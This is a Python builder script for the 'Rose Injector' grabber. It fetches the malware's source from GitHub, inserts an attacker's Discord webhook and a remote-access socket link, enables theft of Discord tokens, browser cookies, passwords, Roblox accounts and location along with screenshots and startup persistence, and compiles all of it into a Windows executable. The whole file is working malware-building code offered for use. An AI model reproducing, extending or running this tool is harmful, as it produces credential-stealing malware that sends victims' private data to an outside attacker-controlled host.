from dhooks import Webhook, Embed 
import os 
import requests
from bs4 import BeautifulSoup
import shutil 
from pathlib import Path
import sys
import ctypes


__icon__ = "https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/tools/rose.png"


async def test_webhook(webhook_url):
    try:
        async with Webhook.Async(webhook_url) as hook:
            embed = Embed(
                description='Webhook is Working',
                color=11795068,
                timestamp="now"
            )
            embed.set_author(name="Success", icon_url=__icon__)
            embed.set_footer(text="Rose Builder | By pierro, suegdu, Gumbobrot, svn", icon_url=__icon__)
            await hook.send(embed=embed)
        return 0
    except Exception as e:
        print(e)
        return 1

class _Builder():    
    def __init__(
        self,
        dir_name,
        webhook_url,
        rat_checked,
        rat_link,
        is_startup,
        is_injection,
        is_tokensteal,
        is_cookiesteal,
        is_passwordsteal,
        is_malicioussteal,
        is_locationssteal,
        is_robloxsteal,
        is_screenshot,
        is_ping
    ):        
        super().__init__()
        self.dir_name = dir_name
        self.webhook_url = webhook_url
        self.rat_checked = rat_checked
        self.rat_link = rat_link
        self.is_startup = is_startup
        self.is_injection = is_injection
        self.is_tokensteal = is_tokensteal
        self.is_cookiesteal = is_cookiesteal
        self.is_passwordsteal = is_passwordsteal
        self.is_malicioussteal = is_malicioussteal
        self.is_locationssteal = is_locationssteal
        self.is_robloxsteal = is_robloxsteal
        self.is_screenshot = is_screenshot
        self.is_ping = is_ping

    def create_dir(self):
        self.path = f"{Path(__file__).resolve().parent}\\{self.dir_name}"
        os.mkdir(self.path)

    def make_req(self):
        page = requests.get('https://github.com/DamagingRose/Rose-Injector/tree/main/source').text
        soup = BeautifulSoup(page, 'html.parser')
        allFiles = [link.text for link in soup.find_all('a') if link['href'] == f"/DamagingRose/Rose-Injector/blob/main/source/{link.text}" ]
        for file in allFiles:
            text = requests.get(f"https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/source/{file}").text
            with open(f"{self.path}\\{file}","w",encoding="utf-8") as f:
                f.write(str(text))

    def edit_config(self):
        with open(f"{self.path}\\config.py","r",encoding="utf-8") as f:
            text = f.read()
            new = text.replace('VMHOOK', f'{self.webhook_url}').replace("WEBHOOK_URL", f"{self.webhook_url}").replace("discord_rat = False", f"discord_rat = {str(self.rat_checked)}").replace("DISCORD_RAT_SOCKET_LINK", f"{self.rat_link}").replace("startup = False", f"startup = {self.is_startup}").replace("self.injection = False", f"self.injection = {self.is_injection}").replace("self.token_stealing = False", f"self.token_stealing = {self.is_tokensteal}").replace("cookie_stealing = False", f"cookie_stealing = {self.is_cookiesteal}").replace("password_stealing = False", f"password_stealing = {self.is_passwordsteal}").replace("malicious_stealing = False", f"malicious_stealing = {self.is_malicioussteal}").replace("location_stealing = False", f"location_stealing = {self.is_locationssteal}").replace("roblox_stealing = False", f"roblox_stealing = {self.is_robloxsteal}").replace("screenshot = False", f"{self.is_screenshot}").replace("discord_ping = False", f"discord_ping = {self.is_ping}")
        print(new)
        with open(f"{self.path}\\config.py", "w", encoding="utf-8") as f:
            f.write(new)

        dir_list = os.listdir(self.path)

        for file in dir_list:
            with open(f"{self.path}\\{file}", "r", encoding="utf-8") as f:
                text = f.read()
                new = text.replace("from configuration", "from config")

            with open(f"{self.path}\\{file}", "w", encoding="utf-8") as f:
                f.write(new)

    def compile(self):
        os.system(f'pyinstaller --noconfirm --onefile --windowed  "{self.path}/main.py"')

    def move_dir(self): 
        shutil.move("dist\\main.exe", f"{self.dir_name}.exe")
        shutil.rmtree('build')
        shutil.rmtree('dist')
        os.remove("main.spec")



    def run(self):
        try:
            self.create_dir()
            self.make_req()
            self.edit_config()
            self.compile()
            self.move_dir()
            ctypes.windll.user32.MessageBoxW(0, "Successfuly built the grabber", "Rose Injector", 0)
        except Exception as e:
            print(e)

if len(sys.argv) > 1:
    print(sys.argv)
    print(sys.argv[1])
    _Builder(
        sys.argv[1],
        sys.argv[2],
        sys.argv[3],
        sys.argv[4],
        sys.argv[5],
        sys.argv[6],
        sys.argv[7],
        sys.argv[8],
        sys.argv[9],
        sys.argv[10],
        sys.argv[11],
        sys.argv[12],
        sys.argv[13],
        sys.argv[14]
    ).run()